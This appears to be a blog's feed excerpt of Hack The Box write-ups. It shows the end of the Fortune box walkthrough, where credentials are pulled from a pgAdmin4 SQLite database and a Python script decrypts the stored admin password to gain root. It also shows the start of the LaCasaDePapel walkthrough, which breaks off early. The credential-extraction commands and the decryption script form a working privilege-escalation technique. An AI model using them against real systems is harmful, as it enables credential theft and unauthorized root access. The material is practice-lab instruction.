&lt;h4 id=&quot;earlier-when-we-got-the-elevated-network-access-there-was-an-http-port-for-pgadmin4-so-i-checked-its-web-directory-in-varappsrv-and-the-database-was-there-&quot;&gt;Earlier when we got the elevated network access there was an &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; port for &lt;code class=&quot;highlighter-rouge&quot;&gt;pgadmin4&lt;/code&gt; so I checked its web directory in &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/appsrv&lt;/code&gt; and the database was there :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;fortune$ cd /var/appsrv/                                                                                                                                                                                          
fortune$ ls -la
total 20
drwxr-xr-x   5 root       wheel     512 Nov  2  2018 .
drwxr-xr-x  24 root       wheel     512 Nov  2  2018 ..
drwxr-xr-x   5 _fortune   _fortune  512 Aug  2 09:15 fortune
drwxr-x---   4 _pgadmin4  wheel     512 Nov  3  2018 pgadmin4
drwxr-xr-x   4 _sshauth   _sshauth  512 Feb  3 05:08 sshauth
fortune$ cd pgadmin4/                                                                                                                                                                                             
fortune$ ls -la
total 252
drwxr-x---  4 _pgadmin4  wheel     512 Nov  3  2018 .
drwxr-xr-x  5 root       wheel     512 Nov  2  2018 ..
-rw-r-----  1 _pgadmin4  wheel  118784 Nov  3  2018 pgadmin4.db
-rw-r-----  1 _pgadmin4  wheel     479 Nov  3  2018 pgadmin4.ini
drwxr-x---  2 _pgadmin4  wheel     512 Nov  3  2018 sessions
drwxr-x---  3 _pgadmin4  wheel     512 Nov  3  2018 storage
fortune$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-downloaded-it-on-my-machine-&quot;&gt;I downloaded it on my machine :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/fortune/ssh# scp -i id_rsa charlie@fortune.htb:/var/appsrv/pgadmin4/pgadmin4.db ../
pgadmin4.db                                                                                                                                                                      100%  116KB   7.7KB/s   00:15    
root@kali:~/Desktop/HTB/boxes/fortune/ssh# 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;then-i-used-strings-to-see-if-i-can-get-anything-interesting-&quot;&gt;Then I used &lt;code class=&quot;highlighter-rouge&quot;&gt;strings&lt;/code&gt; to see if I can get anything interesting :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/fortune# strings pgadmin4.db
SQLite format 3
indexsqlite_autoindex_debugger_function_arguments_1debugger_function_arguments

----------------
 Removed Output
----------------

ConfigDB
	ConfigDB
bob@fortune.htb$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg
charlie@fortune.htb$pbkdf2-sha512$25000$3hvjXAshJKQUYgxhbA0BYA$iuBYZKTTtTO.cwSvMwPAYlhXRZw8aAn9gBtyNQW3Vge23gNUMe95KqiAyf37.v1lmCunWVkmfr93Wi6.W.UzaQ
bob@fortune.htb
3	charlie@fortune.htb

----------------
 Removed Output
----------------

9eSECURITY_PASSWORD_SALTqIhAhRt3xq_dzIEqyJQFmWnymFbO1cZVhbQaTWA-v9Q=9
!eSECRET_KEYR_EFY1hb236guS3jNq1aHyPcruXbjk7Ff-QwL6PMqJM=?
-eCSRF_SESSION_KEYsaQWKx5BCyVZMH2weOiNv3Dsvzh4GchPM16kwBRYPxs=

----------------
 Removed Output
----------------

8postgresdbautUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGzprefer&amp;lt;STORAGE_DIR&amp;gt;/.postgresql/postgresql.crt&amp;lt;STORAGE_DIR&amp;gt;/.postgresql/postgresql.key22

----------------
 Removed Output
----------------
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-got-some-salted-hashes-and-most-importantly-this-&quot;&gt;I got some salted hashes, and most importantly this :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;postgresdba utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGz
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;this-is-the-db-administrators-password-hash-and-we-know-that-its-the-same-as-the-root-password&quot;&gt;This is the db administrator’s password hash and we know that it’s the same as the root password.&lt;/h4&gt;
&lt;h4 id=&quot;pgadmin-is-an-open-source-software-so-i-searched-on-github-for-any-cryptography-related-stuff-and-found-this-script-called-cryptopy&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;pgadmin&lt;/code&gt; is an open-source software so I searched on &lt;code class=&quot;highlighter-rouge&quot;&gt;github&lt;/code&gt; for any cryptography related stuff and found this script called &lt;a href=&quot;https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;crypto.py&lt;/code&gt;&lt;/a&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;i-took-the-functions-needed-to-decrypt-the-hash-then-i-created-a-script-to-take-the-hashthe-key-and-decrypt-the-hash-using-the-functions-from-cryptopy&quot;&gt;I took the functions needed to decrypt the hash then I created a script to take the hash/the key and decrypt the hash using the functions from &lt;code class=&quot;highlighter-rouge&quot;&gt;crypto.py&lt;/code&gt;:&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;__future__&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;division&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;hashlib&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;six&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;cryptography.hazmat.backends&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;default_backend&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;cryptography.hazmat.primitives.ciphers&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Cipher&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;cryptography.hazmat.primitives.ciphers.algorithms&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AES&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;cryptography.hazmat.primitives.ciphers.modes&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CFB8&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;padding_string&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'}'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;iv_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AES&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;block_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;//&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;


&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;pad&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;Add padding to the key.&quot;&quot;&quot;&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;isinstance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;six&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

    &lt;span class=&quot;c&quot;&gt;# Key must be maximum 32 bytes long, so take first 32 bytes&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

    &lt;span class=&quot;c&quot;&gt;# If key size is 16, 24 or 32 bytes then padding is not required&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;

    &lt;span class=&quot;c&quot;&gt;# Add padding to make key 32 bytes long&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ljust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;padding_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ciphertext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
    Decrypt the AES encrypted string.

    Parameters:
        ciphertext -- Encrypted string with AES method.
        key        -- key to decrypt the encrypted string.
    &quot;&quot;&quot;&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;ciphertext&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b64decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ciphertext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;iv&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ciphertext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iv_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;cipher&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Cipher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pad&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CFB8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;default_backend&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;decryptor&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cipher&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decryptor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;decryptor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;update&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ciphertext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iv_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;decryptor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;finalize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;ciphertext&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;raw_input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hash : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;raw_input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;key : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ciphertext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[*] Password : &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;the-only-thing-left-is-to-give-the-right-key-i-tried-the-other-hashes-i-got-from-the-database-as-a-key-and-bobs-hash-worked-&quot;&gt;The only thing left is to give the right key, I tried the other hashes I got from the database as a key and &lt;code class=&quot;highlighter-rouge&quot;&gt;bob&lt;/code&gt;’s hash worked :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/fortune# ./decrypt.py 
hash : utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGz
key : $pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg
[*] Password : R3us3-0f-a-P4ssw0rdl1k3th1s?_B4D.ID3A!
root@kali:~/Desktop/HTB/boxes/fortune# 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/fortune/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---lacasadepapel&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/lacasadepapel/&quot;&gt;Hack The Box - LaCasaDePapel&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---arkham&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/arkham/&quot;&gt;Hack The Box - Arkham&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><category term="BSD" /><category term="Web" /><category term="RCE" /><category term="Python" /><category term="Exploit Development" /><category term="Networking" /><category term="Pivoting" /><category term="ssh" /><category term="php" /><summary type="html">Quick Summary Hey guys today Fortune retired and here’s my write-up about it. It was a very cool box and I really liked it, like the last retired box LaCasaDePapel it had RCE and client certificate generation to access a restricted https service, but that’s only for the initial steps as this box had a lot of interesting stuff. It’s an OpenBSD box and its ip is 10.10.10.127, I added it to /etc/hosts as fortune.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC fortune.htb We have http, https on port 80, port 443 and we have ssh on port 22 so we will be focusing on the web services. HTTP Initial Enumeration The index page on http://fortune.htb is pretty simple, we have some options where we can choose a database of fortunes and we will get a random fortune from that database : On https://fortune.htb we get a handshake error, this probably means that we need a client certificate. RCE, Client Certificate Generation Back to http://fortune.htb I intercepted the request with burp and there was only one parameter in the POST request called db, after trying some different things I could get RCE by appending a semi-colon ; : Request : ``` POST /select HTTP/1.1 Host: fortune.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://fortune.htb/ Content-Type: application/x-www-form-urlencoded Content-Length: 7 Connection: close Upgrade-Insecure-Requests: 1</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/fortune/0.png" /></entry><entry><title type="html">Hack The Box - LaCasaDePapel</title><link href="http://localhost:4000/hack-the-box/lacasadepapel/" rel="alternate" type="text/html" title="Hack The Box - LaCasaDePapel" /><published>2019-07-27T00:00:00+02:00</published><updated>2019-07-27T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/lacasadepapel</id><content type="html" xml:base="http://localhost:4000/hack-the-box/lacasadepapel/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-today-lacasadepapel-retired-and-heres-my-write-up-about-it-it-was-an-easy-interesting-box-more-of-a-ctf-challenge-than-a-realistic-scenario-but-i-still-enjoyed-it-its-a-linux-box-and-its-ip-is-101010131-i-added-it-to-etchosts-as-lacasadepapelhtb-lets-jump-right-in-&quot;&gt;Hey guys today LaCasaDePapel retired and here’s my write-up about it. It was an easy interesting box, more of a ctf challenge than a realistic scenario but I still enjoyed it. It’s a Linux box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.131&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;lacasadepapel.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lacasadepapel/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC lacasadepapel.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/lacasadepapel/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-have-http-on-port-80-https-on-port-443-ftp-on-port-21-and-ssh-on-port-22&quot;&gt;We have &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; on port 80. &lt;code class=&quot;highlighter-rouge&quot;&gt;https&lt;/code&gt; on port 443, &lt;code class=&quot;highlighter-rouge&quot;&gt;ftp&lt;/code&gt; on port 21 and &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; on port 22.&lt;/h4&gt;
&lt;h4 id=&quot;anonymous-authentication-wasnt-allowed-on-ftp-so-i-checked-http-and-https-&quot;&gt;Anonymous authentication wasn’t allowed on &lt;code class=&quot;highlighter-rouge&quot;&gt;ftp&lt;/code&gt; so I checked &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;https&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/lacasadepapel# ftp lacasadepapel.htb
Connected to lacasadepapel.htb.
220 (vsFTPd 2.3.4)
Name (lacasadepapel.htb:root): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;http&quot;&gt;HTTP&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;http://lacasadepapel.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/lacasadepapel/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-see-an-image-of-the-characters-from-lacasadepapel-tv-show-and-a-qr-code-for-otp-i-scanned-it-with-google-authenticator-on-my-phone-&quot;&gt;We see an image of the characters from &lt;a href=&quot;https://www.imdb.com/title/tt6468322/&quot;&gt;LaCasaDePapel&lt;/a&gt; (TV show) and a QR code for &lt;code class=&quot;highlighter-rouge&quot;&gt;OTP&lt;/code&gt;, I scanned it with &lt;a href=&quot;https://play.google.com/store/apps/details?id=com.google.android.apps.authenticator2&amp;amp;hl=en&quot;&gt;Google Authenticator&lt;/a&gt; on my phone :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lacasadepapel/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;as-you-can-see-i-had-to-refresh-it-manually-while-other-tokens-refreshed-automatically-no-idea-why-but-anyway-i-took-the-otp-and-used-testtestcom-as-email-&quot;&gt;As you can see I had to refresh it manually while other tokens refreshed automatically, no idea why but anyway I took the &lt;code class=&quot;highlighter-rouge&quot;&gt;OTP&lt;/code&gt; and used &lt;code class=&quot;highlighter-rouge&quot;&gt;test@test.com&lt;/code&gt; as email :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lacasadepapel/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-nothing-happened-i-just-got-the-same-page-back-again-i-tried-gobuster-to-see-if-i-can-find-any-sub-directories-and-i-didnt-get-anything-useful-lets-check-https&quot;&gt;Then nothing happened, I just got the same page back again. I tried &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; to see if I can find any sub directories and I didn’t get anything useful. Let’s check &lt;code class=&quot;highlighter-rouge&quot;&gt;https&lt;/code&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;https://lacasadepapel.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/lacasadepapel/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-same-background-with-an-error-message-saying--sorry-but-you-need-to-provide-a-client-certificate-to-continue&quot;&gt;The same background with an error message saying : “Sorry, but you need to provide a client certificate to continue.”&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;vsftpd-234-psy-shell&quot;&gt;vsftpd 2.3.4, Psy Shell&lt;/h3&gt;
